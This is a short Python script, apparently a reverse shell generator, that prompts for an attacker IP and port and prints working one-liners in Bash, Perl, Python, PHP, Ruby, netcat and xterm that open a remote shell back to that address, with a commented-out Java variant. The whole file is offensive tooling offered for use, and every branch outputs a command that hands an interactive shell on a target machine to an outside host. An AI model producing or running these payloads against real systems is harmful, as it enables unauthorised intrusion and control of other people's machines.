from sys import exit


def getInfo():
    ipaddr = input("IP (Ex. 10.0.0.1): ")
    port = input("Port (Ex. 12345): ")
    print("Shells will connect to you via \"{0}:{1}\".".format(ipaddr, port))
    print("If you need to change your IP/Port then type \"back\".\n")
    return ipaddr, port


def shellGen(ipaddr, port):
    print("Quit by typing \"exit\" or \"quit\". This program is not case sensitive.")
    print("Shell Types:\nBash, PERL, Python, PHP, Ruby, Netcat, xterm.")

    while True:
        shellType = input("\nWhat type of shell would you like?: ").lower()
        print("")  # Makes output look nicer :P
        input()

        if(shellType == "back"):
            main()
        elif(shellType == "exit" or shellType == "quit"):
            return 0
        # Shellz:
        elif(shellType == "bash"):
            print("bash -i >& /dev/tcp/{0}/{1} 0>&1".format(ipaddr, port))
        elif(shellType == "perl"):
            print("perl -e 'use Socket;$i=\"" + ipaddr + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" +
                  'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");'+'open(STDERR,">&S");exec("/bin/sh -i");};\'')
        elif(shellType == "python"):
            print(
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ipaddr, port))
        elif(shellType == "php"):
            print(
                "php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ipaddr, port))
        elif(shellType == "ruby"):
            print(
                "ruby -rsocket -e'f=TCPSocket.open(\"{0}\",{1}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ipaddr, port))
        elif(shellType == "netcat" or shellType == "nc"):
            print("nc -e /bin/sh {0} {1}".format(ipaddr, port))
        # elif(shellType == "java"): print("This may or may not work. But hey, that's Java for ya!"); print("r = Runtime.getRuntime()"); print('p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])'.format(ipaddr, port)); print("p.waitFor()")
        elif(shellType == "xterm"):
            print("xterm -display {0}:{1}".format(ipaddr, port))
        else:
            print("Invalid Type!")

# Get IP and PORT + init:


def main():
    ipaddr, port = getInfo()
    shellGen(ipaddr, port)


if __name__ == "__main__":
    main()
